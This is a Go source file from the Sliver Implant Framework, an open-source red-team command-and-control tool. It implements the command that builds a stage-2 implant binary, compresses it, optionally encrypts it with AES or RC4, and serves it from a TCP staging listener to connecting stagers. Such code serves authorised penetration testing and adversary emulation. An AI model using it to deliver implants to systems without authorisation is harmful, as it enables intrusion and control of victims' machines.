package tcp

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"net/url"
	"strconv"
	"strings"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/command/generate"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
)

// StageListenerCmd --url [tcp://ip:port | http://ip:port ] --profile name.
func ServeStageCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	profileName, _ := cmd.Flags().GetString("profile")
	listenerURL, _ := cmd.Flags().GetString("url")
	aesEncryptKey, _ := cmd.Flags().GetString("aes-encrypt-key")
	aesEncryptIv, _ := cmd.Flags().GetString("aes-encrypt-iv")
	rc4EncryptKey, _ := cmd.Flags().GetString("rc4-encrypt-key")
	compressF, _ := cmd.Flags().GetString("compress")
	compress := strings.ToLower(compressF)

	if profileName == "" || listenerURL == "" {
		con.PrintErrorf("Missing required flags, see `help stage-listener` for more info\n")
		return
	}

	// parse listener url
	stagingURL, err := url.Parse(listenerURL)
	if err != nil {
		con.PrintErrorf("Listener-url format not supported")
		return
	}
	stagingPort, err := strconv.ParseUint(stagingURL.Port(), 10, 32)
	if err != nil {
		con.PrintErrorf("error parsing staging port: %v\n", err)
		return
	}

	profile := generate.GetImplantProfileByName(profileName, con)
	if profile == nil {
		con.PrintErrorf("Profile not found\n")
		return
	}

	if rc4EncryptKey != "" && aesEncryptKey != "" {
		con.PrintErrorf("Cannot use both RC4 and AES encryption\n")
		return
	}

	rc4Encrypt := false
	if rc4EncryptKey != "" {
		// RC4 keysize can be between 1 to 256 bytes
		if len(rc4EncryptKey) < 1 || len(rc4EncryptKey) > 256 {
			con.PrintErrorf("Incorrect length of RC4 Key\n")
			return
		}
		rc4Encrypt = true
	}

	aesEncrypt := false
	if aesEncryptKey != "" {
		// check if aes encryption key is correct length
		if len(aesEncryptKey)%16 != 0 {
			con.PrintErrorf("Incorrect length of AES Key\n")
			return
		}

		// set default aes iv
		if aesEncryptIv == "" {
			aesEncryptIv = "0000000000000000"
		}

		// check if aes iv is correct length
		if len(aesEncryptIv)%16 != 0 {
			con.PrintErrorf("Incorrect length of AES IV\n")
			return
		}

		aesEncrypt = true
	}

	stage2, err := generate.GetSliverBinary(profile, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	switch compress {
	case "zlib":
		// use zlib to compress the stage2
		var compBuff bytes.Buffer
		zlibWriter := zlib.NewWriter(&compBuff)
		zlibWriter.Write(stage2)
		zlibWriter.Close()
		stage2 = compBuff.Bytes()
	case "gzip":
		stage2, _ = encoders.GzipBuf(stage2)
	case "deflate9":
		fallthrough
	case "deflate":
		stage2 = util.DeflateBuf(stage2)
	}

	if aesEncrypt {
		// PreludeEncrypt is vanilla AES, we typically only use it for interoperability with Prelude
		// but it's also useful here as more advanced cipher modes are often difficult to implement in
		// a stager.
		stage2 = util.PreludeEncrypt(stage2, []byte(aesEncryptKey), []byte(aesEncryptIv))
	}

	if rc4Encrypt {
		stage2 = util.RC4EncryptUnsafe(stage2, []byte(rc4EncryptKey))
	}

	// Always prepend payload size for TCP stagers
	stage2 = prependPayloadSize(stage2)
	ctrl := make(chan bool)
	con.SpinUntil("Starting TCP staging listener...", ctrl)
	stageListener, err := con.Rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
		Protocol: clientpb.StageProtocol_TCP,
		Data:     stage2,
		Host:     stagingURL.Hostname(),
		Port:     uint32(stagingPort),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error starting TCP staging listener: %v\n", con.UnwrapServerErr(err))
		return
	}
	con.PrintInfof("Job %d (tcp) started\n", stageListener.GetJobID())

	if aesEncrypt {
		con.PrintInfof("AES KEY: %v\n", aesEncryptKey)
		con.PrintInfof("AES IV: %v\n", aesEncryptIv)
	}

	if rc4Encrypt {
		con.PrintInfof("RC4 KEY: %v\n", rc4EncryptKey)
	}
}

func prependPayloadSize(payload []byte) []byte {
	payloadSize := uint32(len(payload))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, payloadSize)
	return append(lenBuf, payload...)
}
